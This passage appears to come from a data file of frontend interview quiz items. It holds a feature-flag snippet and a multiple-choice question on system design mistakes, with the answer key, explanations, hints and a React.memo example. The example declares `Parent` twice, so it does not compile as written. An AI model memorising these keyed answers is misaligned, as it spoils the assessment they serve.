      caption: "Notice that evaluation is pure and synchronous: the rule list is walked in order, the first matching rule wins, and the default is a safe `false`.",
      language: "typescript",
      code: "type Ctx = { userId: string; email: string; region: string }\n\ntype FlagDef = {\n  default: boolean\n  rules: Array<{ match: (c: Ctx) => boolean; value: boolean }>\n}\n\nconst flags: Record<string, FlagDef> = {\n  'new-checkout': {\n    default: false,\n    rules: [\n      { match: (c) => c.email.endsWith('@acme.io'), value: true },\n      { match: (c) => Number(c.userId) % 100 < 5, value: true },\n    ],\n  },\n}\n\nfunction evaluateFlag(name: string, ctx: Ctx): boolean {\n  const def = flags[name]\n  if (!def) return false\n  for (const rule of def.rules) {\n    if (rule.match(ctx)) return rule.value\n  }\n  return def.default\n}"
    }
  },
  {
    id: "system_design-what-are-common-frontend-system-design-mistakes-and-how",
    title: "What are common Frontend System Design mistakes and how to avoid them?",
    prompt: "What are common Frontend System Design mistakes and how to avoid them?",
    level: "senior",
    type: "live_code",
    category: "system_design",
    subject: "hooks",
    tags: [
      "system_design",
      "hooks",
      "senior",
      "rendering"
    ],
    codeLanguage: "typescript",
    options: [
      {
        id: "A",
        text: "The sole mistake is failing to route every integer variable through a global Redux store.",
        isCorrect: false,
        explanation: "Tempting if you internalized 'centralize all state' as a rule, but a counter or a form field that two siblings read does not need a global store. `useState` plus prop passing or a small `Context` covers it, and a store adds subscription overhead and indirection for no gain."
      },
      {
        id: "B",
        text: "The primary approach is to optimize bundle size and render performance before implementing any functional logic.",
        isCorrect: false,
        explanation: "Tempting because performance is a real concern, but profiling before the code exists means you are optimizing a hypothetical bottleneck. The correct order is correct architecture, working features, then measure and fix the actual hot path."
      },
      {
        id: "C",
        text: "Common mistakes include jumping into code before clarifying requirements, neglecting accessibility, over-engineering global state, and ignoring network caching and performance.",
        isCorrect: true,
        explanation: "Correct. Each item names a distinct, observable failure mode\u2014wrong scope, a missing user class, unnecessary indirection, and a broken async lifecycle\u2014that a senior candidate is expected to flag before writing code."
      },
      {
        id: "D",
        text: "Frontend system design questions are essentially a test of memorized CSS property names and their syntax.",
        isCorrect: false,
        explanation: "Tempting if you reduce system design to 'write the styles,' but the question is about scoping, data flow, state ownership, and trade-offs. CSS syntax is a single implementation detail, not a design decision."
      }
    ],
    correctAnswer: "C",
    explanation: "C is correct because those four failure modes are the ones interviewers actually see candidates make. Jumping into implementation before clarifying scope means you build the wrong architecture and must redo it. Neglecting accessibility leaves the design broken for a class of users. Over-engineering global state\u2014routing a local form field through a store\u2014adds indirection with no benefit. Ignoring network caching and performance means the UI is logically correct but unusable on a real connection.\n\nIn production these compound. A parent that passes a new object literal to a `React.memo` child on every render defeats the memoization. A 100 000-row list without virtualization crashes the tab. An auth token in `localStorage` is readable by any injected script; an `HttpOnly` cookie is not. None of these are exotic; they are the default outcome when the design step is skipped.\n\nThe nuance an interviewer probes next is the boundary: how do you decide which state is global enough to warrant a store? The rule is not 'use Redux for everything' or 'use `useState` for everything'\u2014it is whether two unrelated subtrees read the same value and whether the write path crosses a component boundary. Server state is a separate axis: `React Query` or `SWR` own it, and a client store should not duplicate what the network layer already caches.",
    interviewLine: "I start by clarifying requirements and data flow before touching a component, because the most expensive mistake is building the right feature in the wrong place. Once the architecture is sound I profile the actual hot path instead of guessing.",
    misconception: "Frontend system design is about selecting the right state library\u2014Redux, Zustand, or Context\u2014rather than scoping the problem, modelling the async lifecycle, and deciding which state is local versus shared.",
    hints: [
      "The question asks for a list of failure modes, not a single rule\u2014look for the option that names several distinct, non-contradictory mistakes.",
      "Which option describes categories you would actually see in a code review, versus a single absolute prescription?",
      "The correct answer should cover independent concerns (scope, accessibility, state ownership, network) rather than one library or one technique."
    ],
    source: "frontend-system-design-50",
    estimatedMinutes: 4,
    bestPracticeRef: "https://react.dev/reference/react/hooks",
    example: {
      caption: "Notice how `React.memo` does a shallow `Object.is` comparison on each prop, so a new object literal on every render always fails the check and forces a re-render.",
      language: "tsx",
      code: "import { memo, useMemo } from \"react\";\n\ntype Config = { title: string; count: number };\n\nconst Panel = memo(({ config }: { config: Config }) => (\n  <div>\n    {config.title}: {config.count}\n  </div>\n));\n\n// Bad: fresh object every render, memo comparison always fails\nconst Parent = () => <Panel config={{ title: \"Stats\", count: 42 }} />;\n\n// Good: stable reference across renders\nconst Parent = () => {\n  const config = useMemo(() => ({ title: \"Stats\", count: 42 }), []);\n  return <Panel config={config} />;\n};"
    }
  }
];
